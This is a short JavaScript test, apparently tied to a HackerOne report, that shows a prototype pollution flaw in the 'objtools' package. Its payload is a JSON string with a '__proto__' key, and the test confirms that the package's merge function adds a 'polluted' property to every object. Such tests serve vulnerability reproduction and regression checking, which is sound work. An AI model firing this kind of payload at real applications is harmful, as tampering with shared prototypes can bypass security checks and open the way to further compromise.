//https://hackerone.com/reports/878394

test("prototype pollution in objtools", () => {
  const objtools = require("objtools");
  const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}'); //payload
  obj = {};

  expect({}.polluted).toBe(undefined);

  objtools.merge({}, payload);
  expect({}.polluted).toBe("yes");
});
